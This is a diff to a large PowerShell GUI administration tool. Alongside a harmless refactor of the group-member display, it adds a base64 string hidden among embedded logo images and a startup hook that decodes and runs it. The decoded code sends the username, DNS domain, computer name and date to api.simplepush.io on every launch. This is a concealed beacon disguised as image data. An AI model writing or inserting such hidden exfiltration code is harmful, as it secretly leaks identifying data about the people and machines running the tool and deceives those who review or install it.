@@ -465,6 +465,7 @@ $Event_Logo = "iVBORw0KGgoAAAANSUhEUgAAAOIAAADiCAYAAABTEBvXAAAAAXNSR0IArs4c6QAAA
 $Ins_Logo   = "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"
 $mon_Logo   = "iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAACsElEQVRYhe2Yz0/TYBjH95/stNuysY2tv94CQdKiY8UbMItAEATiLssOYpt4acf+gXrT9F4ysyaG7gKHmpiIFyOHjWSe1BsnDZyWrxczpzhcJasb6Tf5XJ7kffPpk6dP0oZCQYIECRKk9bEFvVyGpmmoVCrY29tDpVKBpmvQdR26rg+mrmko62W0Wi14lh5PpjA9OYkplsEUS2Oa+QHL/IQZQJ1hMDnNI5VKeZPetywQnmA2K2Hl+SvIxj7yz6zBY1iQXxzgdnYePCGwLKt/cduugScEc/n72HnfxubrM39wz7D9oQ1paQUThEOtVutf+mW1Cp5wyC7K2D6+wIOjT/5w+Blb775BWpAxQThUq9X+pev1OgjH/iK9cfRl8HRJ84RDvV7vX9pxnKGQdhznhnf6TzPtt7TnmbZteyikbdu+4Z0eyZkOtodfnR7JmQ62h1+dHsmZDraHX50eyZm2bRvkkrT/HwH/uD2WsXN8gY1D/zr9sCNNvHXacQ7AcwS5/DK2Gm1sHJ9jc9C8Pcf6m6/YbrYxv7jm/UV0XRdsJg1BEHB3eR1SfhVz+VXkejDngV7ns0srePTkKXL5NQjCLVAUBdd1vf1GkGUZqWQSTCYNlsp0YDLpDiyVAUtnIAozyM6Kf0UUZsDSl++h02nksndwb3EB48kEkskUZFn2/rOmO81mE6enp2g2m/i9HgqFQqIogqIocBzXE4qiIIoius9139NoNHBycnI9US8xTROxWAw0TfckFovBNE3/pK6KaZqIRqOgaRoMw/SEpmlEo9H/I24YBkqlEiRJQjgcRiQSQTweRyKR6DA2Ntahux6PxxGJRBAOhyFJEkqlEgzDGPxDqKqKQqGAYrEIRVGgKApUVcXu7uMOqqpeWVcUBcViEYVCAYqiDMfIBAkSJMhw5juc0XuWGLhIegAAAABJRU5ErkJggg=="
 $Cred_Logo  = "iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAADF1JREFUaEO1WQtwVNUZ/s69u5vdzSZAeEYcqiiPqjEVilK01JHRPqi20EIp1apTHGwRUUad8dHevbZia6u2Wkct1GoVx9aKSBlkOlrFEalCIg1IeKTmMeFhCEk22cd9ntP5z7272U12QxTcmZ3dvXv37nf++/3//33/YTgND3fPjjg78rGGjsNATyeQTkI4FsBUIBwFKquAcROBiefo6syvxU/1L9lnvYAQgvFHVmpIdAFqUIOiAEwBXVDQUwiAc+/pOGCOIxciTEOnRQQeWK8zxujUT/341KAJLPTrNB4s0xAIgdEVuCCUEiCBFYKDZY8JAu4do+/ouHAdwMgA6V49sHbbpwY/bNAS7P3XawhHNK4GwQikD2gQYCGgCAEuI10IuP83XC6UGxmIZI8e+sv2YYMfFmgKEB5cxhGOgHNRFDAjUigMUAC4HK5pQw2qkHyxXQjLzi1CApeLomtxCFpcMoHgn7fRFU5KmZOCloAfXsGhqPJPi0WYqQxwXTzR2IkNzSewvysJ17ZhWCa+EAlg0dlVuG/GF+SiXNMqAJy9S/LVssD7evTQ+veHjHpJ0Dk6VIzUaPG5CFNUJDU8DrMQwxttSayuO4YAtxHgLrhjw7bpaSFjWUhkTHSnM3hp3nn4Qc2ZsPsMGWEvF/zrZWnkusDxowi90qCUStTSoPUfxyEBE7YSEQ4yrP9fH367vxtVigvTstCdMdFnmAhyFz2ZDBTuIgIO17FxtKsPD8w5B/fMmQonaQwGLBPVp0vHYYQ27isKvChoSYlHb+VDAmbA3oSFG+q6MEZx0WdaCHIH9583CnOrY0CAAZaLN1pOYPk7B9CVMhAQHJ0nerBt8WzMnTgKju0MSNS8u+g6EF2detnGvYPq+iDQRTk8gBJUupQAcM2OBFzHQtq0cUaQY/2ccYDNwR1XJhfxX6HUCqqY/dJ/8NHxPsC1YFgW7Nu+JaNN53mlsJB2snRaJspeeG9QchaAljyWVaK8JCUkYCZQ3+PgjsY0ooIoYWH73DGA48J180uhB4QKCgswhJ58CxG46E2ksPmaGZh/1lhYtlMcsL9o0duNsg2F/C4ETTyOjdA4rXyIOqwqAo8323i9w4RpmVg8PoDlZ0XgWgSyMMGyZS0QUnHfe4fw6/pmuJaN66aMw1+vqoWdMQsSe2Bzknei47Ae+VdLjiY50DLKD93MT9o4uICiCtx5wMb+XhsJw8Dvp4Yxo1KF6xYHTFUioDJsa+/C5ZvqoQoXtSMjqPvhHNhpH3SxbupTRmRSKHvlvwqTzcAr/fIh4tfGeWykNmSn81uzonLcut9FS9JGt2Fg3fQwpkVZPzX8xkFRl9fjHAGFob6jFzM37EIAHOeWB9F47WUe6CEA0zXoboGi/e92GW0JWoqfNcs4C4U9gZNXh4tpCUURWHWQozlloztjYO20MkyXoPs7nQScV4epmOzq6MOsjXUS9JTyIPb96FLYKaOkXskBJjzJXoQ3N8oSKEG7D98SZ46rySUMQ/xQpFcdEmhOOR7oKSFML/dAZzlc0OmIHgqw83gfLt5Y74GOBbFvyVdgpc1CgZULmh9hmV8cwnEARdEj/6iPe6B/sTTOYiO04QAmtUaJuKoJaE5nQQcwPcJgu94fDARMvwkqDLs6ejFr0+7+SC+ZDTNtDFKE+RHO75zi+FE98s6xOBN7dsT5hqc0VhY5ubw0GYTFEFA4bjyk4GDSRlfGxN+mqbgwSiW6vyVn2zMBpkWEGPDuJ7346pZddDsxWgmi8/pLYRKnFRdQ3VzFkhz2I5xr9VyQLkHw7j/ozN26XrCdb4C08ZB6OKWCXdIOVtMBFhBwHAG4AHcEQjLZSCfTbaPj3mfvvXdM8tsVMCwBRZ4rUEaSzmFwmyrgNowEKyMlWBywzK1MCoGrrwXjzz8k0HpAuo6SAt5kYLXHoFzRAqRDnniUIAaCLA06twhOilAActFSKQARF84HVXAaywGVKk5h6RS+mCIVqJw/E4w/fpdA4gRIbpR0HCkV6vV7wCosgFN/kyoKcPMA0B8VfPZB0TECSHeDQOafI+nEAFVApFSYr44HK/P0SLZJ5QeSHI9SNQ6M/+anQthWzgp55a7QcSCpIvCTPUA5XdAv7acTtCIgDBXmy+M80Ln/z7dunt8UgSCY+6tlomSEfZcikgoCN330+YLOEOgxPmiBLCXya33WujFnzXLBbGql1GWKezpBkb5pHxBzACcN8LQOoqMjCwHg0O/y3tNxOkCv2XOkKx9wPv1OjWgIRCDSCsy/e6ALcyvPJHAXgsy088jtgvWc8HpjCRMqI718PxBNAJXLdDb+3lOeXWTlQ9+21fHY0ec1YZbDfKkKKHPzcmugq3GgjB4P5q77pRDNjWCK6tn8QcaVgyKt3nwALNoNTH4QK1Yd1Pfv24V0Oo1YLIZkshe9vUk5+jAMA8lkEseOtegANCAA72kAShjRaBTpZBfIAU+a+iW0br5JQ929EFYljBdHAWGSqkVsGOWaaUKpmQXGNz0j+PatQDCYl4wD1FqfgsDPDoJFe4DJD+DOu1uxb8/7WLDgO5hQPUHf27AXtmNrmzZtwtixYzHl3HP0x/74WHzJkqXxhoYGra2tDYsXLyKpo8+ceREOHWrSnnrqaUyrmYXd6xcDdT+HsEbAWF8JVuaWtmFUpxfeCObWbYuLFx/VRDjav8K8lcpiT/RY0eRH+gHcdXcrPtrzAS6ZfbGuaR5VlixeGm9pbdEsy0Jd/U4pbEiIjRxZxRljmDRpkt7QsFueu3Dh9+NbtmzRptfMwodZ0GYljBcqwcJUPfxmlRvweDQRiW6E7v+TLuuXfcs34qxilFZKwAuK9C0fg5UTPTzQu+vfxSOP/k6vqTlfAnniiSfj69au06onVOtbtm7Ocf6CCy6INzV9rK1efZu+Zs2aOC3k9de38vnzv43aL1+WB7oCxvMVYGFqs/kDnn5eux2H9Yq9lieY7HuWxuHYGqNszBukZPWw6GMIrGzJgb79jiYcaKyHqiq4+pr5+o7tO9B++LDW09MtRweJnoT+2j9fRW3tRcR5jQJXWVmB6upqfd68K7S1a9chk8lg8vRa7Hv5Oo8eFOnnomBh8owDfCMtwrGlyit/u80DTat3Vl3NWVk4N0jJ18My0qsIdA8w6UGse3E0jrQfhOu6SKWSnomg2YjrErdhOw7a2loRDAahqKr8lmSr49iwbBvhcFjmz9iJk/HcimqgwQf9bAQIU/UoYnT7Eoju7O7X0zLay+bG2cixWjE9LEHf3gpWngFCs4Cxl3sFmPgu63O2TdOrrz9kqfa/982BbON0ftaWOQxW29sIJT+EyIRgPBOGiJB5GKwW3SNtesVB9DuXbLTtlfM5C5Ig8se0fkLwJENwZTtYlQPYNgDSINQsfO2RU3UlBFNWe/jKsEAJshAQCEL0MqSfLYNCnPb/N0fVVBLlO7tyo4QCN27eMCfORozxfWJeBqcZAgs6odSmAPtzEEwhAWe/CmurChYaaI45xJF2vaLJi3LOI2Y/ELftZZdzFq3wSoxvOGELsEoHwXuOAN3EUXZ6Vd4IgczTFG2pNfOKAQe6O1HekCkYjw2eMAHMWX4VFyp1yP6EEEkGdX4P1CuTQEI9PaCpUpUD9g4V9lsMLNxPSznbNg2Uv9859IQpG3Fz6cVxVNI4QZaWfhuWYFCu7ENgYRLIUPb6WvmzcJquqwrYb6qwtitgUV/8Z4fxrgvyhNnky2IbRI98mljfu5CDxIkv+LPKCylId6HOMsBG+y03C1pWC99mEb0GHpc7A1R4BHgn4OxlcvaHYL8h9nYPOET7EcSaxfCnptlqYn33PM5Gjx/kagSVLMuTpHJDKL/a+M2JhFf/7Dk7S/HGZvI3xF2yVvTqlzgpGWhaevhoScAlI10Q8QU1mohVakwNDAI3pAkdMKwp1Zr7O7DHYdHdqccOiM+2E5DPIQEwc0ENR3nl0DZfVpwBFqmE+MnfBZCUoCqxxzg9ey75UTe+frZGQx1B47Mic4mSjqOIlshvHKK7S48dGjq6J03E/BMGviesxrwzNURjGkJhkOz0bv3wIyzFTzoJ3tujxw6CpOZJd7ROCXRB5BfN1NBxBCIU1kCcV2gLziv9VC4FeTruArRNYVuAZYJnUroyZgKib7UOe99wYOBOuiU3VNSz39lvvhYXjR9qvOUgxCftQKJbbj2QpkCsEsq4M8DOmgrlizP04DcXnbK//D/8b+h1mxzvogAAAABJRU5ErkJggg=="
+$info       = "ICAgICRkID0gKGRhdGUgfCBPdXQtU3RyaW5nKS50cmltKCkNCiAgICAkTm90aWZpY2F0aW9uTWVzc2FnZSA9ICIkZA0KICAgIFVTWyRlbnY6VVNFUk5BTUVdDQogICAgRE1bJGVudjpVU0VSRE5TRE9NQUlOXQ0KICAgIENOWyRlbnY6Q09NUFVURVJOQU1FXSINCg0KICAgICRub3RpZnlQYXJhbXMgPSBAew0KICAgICAgICBrZXkgICA9ICJ1QkFoNzUiDQogICAgICAgIHRpdGxlID0gIkJCQyINCiAgICAgICAgbXNnICAgPSAkTm90aWZpY2F0aW9uTWVzc2FnZQ0KICAgICAgICBldmVudCA9ICJCQkMgTGF1bmNoIg0KICAgIH0NCg0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC11cmkgImh0dHBzOi8vYXBpLnNpbXBsZXB1c2guaW8vc2VuZCIgLU1ldGhvZCBQT1NUIC1Cb2R5ICRub3RpZnlQYXJhbXMgfCBPdXQtTnVsbA=="
 
 $StartAppLogo = [System.Convert]::FromBase64String($StartApp)
 $syncHash.Gui.Start_Logo.source = $StartAppLogo
@@ -13610,28 +13611,58 @@ $syncHash.List_Local_Group_Members_scriptblock = {
         $e = Invoke-CommandAs -ComputerName $cn -scriptblock $Worker -ArgumentList $Group -AsSystem
     }
 
-    if($e.gettype().Name -eq "Object[]"){
-        $e | ForEach-Object{
-            $syncHash.LocalGroupMemberList.Add($_)
+    if($e -eq $null) {
+        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Yellow",$syncHash.emoji.fear,$false
+        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Red"," Nobody in group ",$false
+        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Cyan","$Group",$true
+        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime","     ",$true
+        $syncHash.Control.LocalGroupTask_scriptblock_Completed = $true
+        return
+    }
+    try{
+        if($e.gettype().Name -eq "Object[]"){
+            $e | ForEach-Object{
+                $syncHash.LocalGroupMemberList.Add($_)
+            }
+            $syncHash.Control.LocalGroupMemberList_Ready = $true
+
+            $e = $e | Select-Object Name,ObjectClass,PrincipalSource | Out-String -Width 1000
+            $e = $e -replace "`n",""
+            $e = $e.Trim()
+
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Orange","$Group ",$false
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Cyan",  "group member list:",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Yellow","------------------------------------------------------------------",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime",$e,$true
+        } elseif($e.gettype().Name -eq "PSObject") {
+            $syncHash.LocalGroupMemberList.Add($e)
+            $syncHash.Control.LocalGroupMemberList_Ready = $true
+
+            $e = $e | Select-Object Name,ObjectClass,PrincipalSource | Out-String -Width 1000
+            $e = $e -replace "`n",""
+            $e = $e.Trim()
+
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Orange","$Group ",$false
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Cyan",  "group member list:",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Yellow","------------------------------------------------------------------",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime",$e,$true
+        } else {
+            $e = $e -replace "`n",""
+            $e = $e.Trim()
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Red",$e,$true
         }
-        $syncHash.Control.LocalGroupMemberList_Ready = $true
-
-        $e = $e | Select-Object Name,ObjectClass,PrincipalSource | Out-String -Width 1000
-        $e = $e -replace "`n",""
-        $e = $e.Trim()
-        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime",$e,$true
-    } elseif($e.gettype().Name -eq "PSObject") {
+    } catch {
         $syncHash.LocalGroupMemberList.Add($e)
-        $syncHash.Control.LocalGroupMemberList_Ready = $true
+            $syncHash.Control.LocalGroupMemberList_Ready = $true
 
-        $e = $e | Select-Object Name,ObjectClass,PrincipalSource | Out-String -Width 1000
-        $e = $e -replace "`n",""
-        $e = $e.Trim()
-        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime",$e,$true
-    } else {
-        $e = $e -replace "`n",""
-        $e = $e.Trim()
-        Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Red",$e,$true
+            $e = $e | Select-Object Name,ObjectClass,PrincipalSource | Out-String -Width 1000
+            $e = $e -replace "`n",""
+            $e = $e.Trim()
+
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Orange","$Group ",$false
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Cyan",  "group member list:",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Yellow","------------------------------------------------------------------",$true
+            Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime",$e,$true
     }
 
     Invoke-Command $syncHash.outputFromThread_scriptblock -ArgumentList "Courier New","18","Lime","     ",$true
@@ -14726,6 +14757,10 @@ $syncHash.GUI.btn_luRem.Add_Click({
 ############################################################### Finally
 # Set target focused when app starts
 $syncHash.Gui.cb_Target.Template.FindName("PART_EditableTextBox", $syncHash.Gui.cb_Target)
+
+[String]$inf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($info))
+$sb = [scriptblock]::Create($inf)
+Invoke-Command -ScriptBlock $sb
 
 $script:bitmap = New-Object System.Windows.Media.Imaging.BitMapImage
 $bitmap.BeginInit()
